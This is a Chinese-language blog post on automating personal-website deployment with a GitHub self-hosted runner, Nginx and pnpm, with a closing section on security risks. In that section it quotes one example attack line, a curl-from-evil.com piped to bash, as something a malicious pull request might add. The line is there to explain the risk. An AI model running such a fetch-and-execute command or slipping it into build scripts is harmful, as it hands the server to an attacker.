---
title: 从零部署个人网站：GitHub Actions + Self-hosted Runner
description: 记录个人网站从代码托管到自动化部署的完整流程，包括踩过的坑和最终方案
date: 2026-07-10
image: https://chengjiabiao.com/og.png
art: random
---

# 从零部署个人网站：GitHub Actions + Self-hosted Runner

## 前言

网站做好了，下一步就是部署。我想要一个"push 代码就自动部署"的工作流，看起来很简单的需求，没想到踩了一连串的坑。这篇文章记录整个过程、问题排查和最终方案。

## 一、最初的想法：GitHub Actions 一把梭

我的需求很简单：
- 代码推到 GitHub
- 自动部署到我的服务器
- 以后只需要 `git push` 就能更新网站

于是我创建了第一个 workflow：

```yaml
name: Deploy to Server
on:
  push:
    branches: [main]
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - name: Deploy via SSH
        uses: appleboy/ssh-action@v1
        with:
          host: ${{ secrets.SERVER_HOST }}
          username: ${{ secrets.SERVER_USER }}
          key: ${{ secrets.SERVER_SSH_KEY }}
          script: |
            cd <YOUR_PROJECT_PATH>
            git pull origin main
            pnpm install --frozen-lockfile
            pnpm run build
            sudo systemctl reload nginx
```

然后满怀期待地 `git push`，结果：

## 二、第一道坎：服务器安全策略拦截

GitHub Actions 报错：

```
The job was not acquired by Runner of type hosted even after multiple attempts
```

我以为是 GitHub 服务挂了，等了一会重试，还是不行。本地 `ssh <USER>@<YOUR_SERVER_IP>` 完全正常，说明不是 SSH 配置问题。

最后发现问题：**GitHub Actions 的托管 Runner 在美国，服务器的安全策略把海外 IP 标记为高危，直接拦截了**。

> 解决思路 1：白名单 GitHub Actions 的 IP 段  
> 放弃原因：IP 段太多且会变动，维护成本高

> 解决思路 2：服务器主动从 GitHub 拉取（Webhook）  
> 放弃原因：Webhook 仍然需要 GitHub 主动推送，也会被拦截

> 解决思路 3：**Self-hosted Runner（在服务器上跑 Runner）**  
> ✅ 采纳：Runner 在服务器本地运行，根本不走 SSH 远程连接

## 三、Self-hosted Runner：柳暗花明

### 3.1 什么是 Self-hosted Runner

GitHub 允许你在自己的机器上安装 Runner 程序，GitHub 通过 HTTPS 协议把任务派发给 Runner，Runner 在本地执行命令。

**核心优势**：
- Runner 在服务器本地执行 `git pull` 和构建
- 不需要 SSH 远程登录
- GitHub → Runner 的通信是 HTTPS，不会被 IP 拦截

### 3.2 安装 Runner

去 https://github.com/qinxiushan/personal-website/settings/actions/runners/new 按照提示操作。

**坑点 1：服务器无法下载 Runner**

```bash
curl -o actions-runner-linux-x64-2.319.1.tar.gz -L https://...
# curl: (56) Failure when receiving data from the peer
```

服务器在中国，下载 GitHub 文件经常失败。

**解决方案**：本地下载后 `scp` 上传。

**坑点 2：直接运行 `./run.sh` 不行**

我以为运行 `./run.sh` 就完事了，结果关闭终端 Runner 就停了。GitHub Actions 触发时，Runner 已经退出了。

**解决方案**：必须用 `svc.sh` 安装为系统服务：

```bash
sudo ./svc.sh install
sudo ./svc.sh start
```

这样 Runner 会作为 systemd 服务后台运行，开机自启。

### 3.3 修改 Workflow

把 `runs-on: ubuntu-latest` 改成 `runs-on: self-hosted`：

```yaml
name: Deploy to Server
on:
  push:
    branches: [main]
  workflow_dispatch:
jobs:
  deploy:
    runs-on: self-hosted  # ← 关键改动
    steps:
      - name: Deploy
        run: |
          cd <YOUR_PROJECT_PATH>
          git pull origin main
          pnpm install --frozen-lockfile
          pnpm run build
          sudo systemctl reload nginx
```

`workflow_dispatch` 允许手动触发，方便调试。

## 四、Nginx 配置：让网站跑起来

部署脚本只是构建出 `dist/` 目录，还需要 Nginx 把这个目录暴露到公网。

### 4.1 创建站点配置

```bash
sudo nano /etc/nginx/sites-available/chengjiabiao
```

```nginx
server {
    listen 80;
    server_name chengjiabiao.com www.chengjiabiao.com <YOUR_SERVER_IP>;
    root <YOUR_PROJECT_PATH>/dist;
    index index.html;

    location /assets/ {
        expires 1y;
        add_header Cache-Control "public, max-age=31536000, immutable";
    }

    location / {
        try_files $uri $uri/ /index.html;
    }
}
```

**坑点 3：默认站点冲突**

如果 `/etc/nginx/sites-enabled/default` 存在，会覆盖你的配置。一定要删除：

```bash
sudo rm /etc/nginx/sites-enabled/default
```

**坑点 4：SPA 路由 404**

刷新页面时 Nginx 会去找对应的文件，找不到就 404。`try_files` 指令让所有未匹配的请求都回到 `index.html`：

```nginx
location / {
    try_files $uri $uri/ /index.html;
}
```

### 4.2 启用配置

```bash
sudo ln -s /etc/nginx/sites-available/chengjiabiao /etc/nginx/sites-enabled/
sudo nginx -t  # 检查配置语法
sudo systemctl restart nginx
```

## 五、首次部署：完整流程

**1. 准备工作**

```bash
# 服务器上克隆代码
mkdir -p <YOUR_PARENT_DIR> && cd <YOUR_PARENT_DIR>
git clone git@github.com:<USER>/<REPO>.git chengjiabiao
cd chengjiabiao
```

**2. 手动构建一次（让 dist 目录存在）**

```bash
pnpm install
pnpm run build
```

**3. 浏览器访问**

打开 `http://<YOUR_SERVER_IP>`，看到网站说明 Nginx 配置成功。

**4. 测试自动化**

去 https://github.com/qinxiushan/personal-website/actions 点击 **Run workflow**，验证 Self-hosted Runner 能正常接收任务并完成部署。

## 六、避坑清单

| 坑 | 原因 | 解决 |
|---|---|---|
| `styleText` 报错 | Node.js 版本太低 | 升级到 Node.js 22 |
| Runner 不响应 | 没装系统服务 | `sudo ./svc.sh install && start` |
| 托管 Runner timeout | 美国 IP 被拦截 | 改用 Self-hosted Runner |
| 刷新页面 404 | 缺少 fallback | `try_files $uri /index.html` |
| Nginx 配置不生效 | 默认站点冲突 | 删除 `sites-enabled/default` |
| 私有仓库额度限制 | GitHub 免费版限制 | 改用 Public 仓库 |

## 七、总结

整个流程走下来，其实核心思路就一句话：**让服务器自己干自己的事**。

- 托管 Runner 远程 SSH → ❌ 被拦截
- Self-hosted Runner 在服务器本地执行 → ✅ 完美

部署完成后，每次 `git push`，GitHub Actions 会在 1-2 分钟内完成：
1. Runner 拉取最新代码
2. 安装依赖
3. 构建静态文件
4. 通知 Nginx 重新加载

比手动 SSH 服务器 `git pull` 省事多了。

下一步计划：
- 配置 HTTPS（Let's Encrypt）
- 添加部署通知（钉钉/Telegram）
- 优化构建速度（pnpm 缓存）

完整的技术文档已经写进项目根目录的 `部署集成自动化工作流说明.md`，可以参考。

## 八、补充：关于 corepack 和 pnpm 安装

有读者问：为什么用 `corepack` 而不是 `npm install -g pnpm`？

两者都能装 pnpm，但有本质区别：

| 方式 | 版本控制 | 推荐 |
|---|---|---|
| `npm install -g pnpm` | 全局最新版，可能不匹配项目要求 | ❌ |
| `corepack prepare pnpm@11.2.2 --activate` | 锁定到项目要求的版本 | ✅ |

`package.json` 里写了 `"packageManager": "pnpm@11.2.2"`，corepack 会确保使用这个版本。如果用 `npm install -g pnpm`，可能装到 `pnpm@12.x`（最新版），然后报各种兼容性错误。

**corepack 是 Node.js 官方内置的包管理器管理工具**（Node 16.10+），不需要额外安装。

## 九、安全风险与防护

部署跑通后，我才意识到几个安全问题，这里补充一下。

### 9.1 公开仓库 + Self-hosted Runner 风险

GitHub 在配置 Runner 页面会提示：

> Using self-hosted runners in public repositories is not recommended. Forks of your public repository can potentially run dangerous code on your self-hosted runner by creating a pull request.

**这意味着**：如果我的仓库是 public，任何人都可以 fork 后提一个 PR，PR 触发的 workflow 会执行**我的服务器上的代码**。

**风险场景**：
- 恶意 PR 在 build 脚本里加 `curl https://evil.com/x.sh | bash`
- 反向 shell 连接到攻击者服务器
- 读取服务器敏感文件
- 安装挖矿程序

**为什么我的方案相对安全**：
- workflow 只监听 `push: branches: [main]` 和 `workflow_dispatch`
- **不监听 `pull_request` 事件** → 外部 PR 不会触发部署
- 只有仓库管理员（我）能 push 到 main 分支

**进一步加固**（推荐）：
1. workflow 显式排除 PR 触发（防御性写法）
2. Runner 用户用低权限账号，不用 `sudo`
3. 服务器加 fail2ban 防爆破
4. 定期审计 Runner 日志

### 9.2 暴露 IP 和路径的风险

写博客时差点把服务器的 IP、用户名、项目路径都贴出来。**这是非常危险的**：
- 攻击者拿到 IP → 扫描端口
- 拿到用户名 → SSH 爆破
- 拿到路径 → 针对性攻击

**正确做法**：
- 博客用占位符 `<YOUR_SERVER_IP>`、`<YOUR_PROJECT_PATH>`
- 真实配置写在私有笔记或本地文档
- 服务器用非默认端口（不要用 22）
- SSH 禁用密码登录，只允许密钥
- 关键路径在 Nginx 配 `internal` 限制外部访问

### 9.3 为什么我没用 Docker

理论上 Docker 隔离更安全（构建在容器里，不污染宿主机），但 Self-hosted Runner 已经是独立用户运行的进程，隔离性足够。Docker 会增加复杂度：构建慢、需要管理镜像、占用更多磁盘。

**什么时候应该用 Docker**：
- 多人协作的团队项目
- 公共仓库 + 担心 PR 风险
- 构建环境需要严格一致

---

**总结：自动化部署是"用便利换风险"的过程**，一定要清楚自己在做什么、暴露了什么。我的方案因为：
- 单人维护
- 只监听 push 事件
- 关键信息用占位符

所以风险可控。但如果你的仓库是多人协作的公共项目，建议重新评估 Self-hosted Runner 的必要性。
